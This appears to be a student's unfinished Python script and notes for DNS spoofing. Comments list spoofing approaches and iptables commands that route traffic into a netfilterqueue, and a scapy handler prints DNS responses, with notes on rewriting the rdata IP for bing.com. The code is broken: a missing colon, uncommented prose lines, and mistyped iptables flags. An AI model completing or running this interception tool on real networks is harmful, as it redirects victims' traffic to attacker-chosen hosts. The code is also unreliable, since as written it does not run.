#How to do dns spoofing
# option1: Install a dns server with an application similar to the one, installed on the webserver
# Configure webserver to return the corresponding
# request to be returned from server
# option2: Craft a dns response in the hacker computer and
# send it back to the user,given them this false ip instead of the
# actual ip for bing. This requires us to have extensive knowledge on how DNS works
# and how network layers work
# option3: Forward the request that the user made to the right
# DNS server , wait for the response and once we get the response, hacker machine will modify
# this response, by modifying only the IP part and instead of sending right IP we will send the
# IP that we want


#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #to check dns packets add hasLayer check
    #to check if scapy packet has a DNS response layer
    # DNSRQ -> DNS Request
    # DNSRR -> DNS Response
    if scapy_packet.haslayer(scapy.DNSRR)
        print(scapy_packet.show())
    packet.accept()

#Generate a DNS request from Kali machine and see what the response looks like
#To redirect all input and output packets from
# my computer to queue use iptables command
#
# iptables -I OUTPUT -J NFQUEUE -queue-num 0
# iptables -I INPUT -J NFQUEUE -queue-num 0
#
# Generate a DNS request by using ping command

# Import things to note in DNS response
# DNS question record
#     qname = 'www.bing.com'
#     qtype = A
#     qclass = IN
#
# DNS Resource Record
#     rrname = "aa-0001-a-msedge.net."
#     type = A
#     rclass = IN
#     ttl = 57
#     rdlen = 4
#     rdata = "204.79.197.200"

# Here rdata field is the field that contains the IP, which is the same
# IP which we received while we pinged bing.com

So this is the field which we want to modify first
    rdata = "204.79.197.200"
But before we modify this field, we only want to modify this field whenever the user tries to go to bing.com






queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()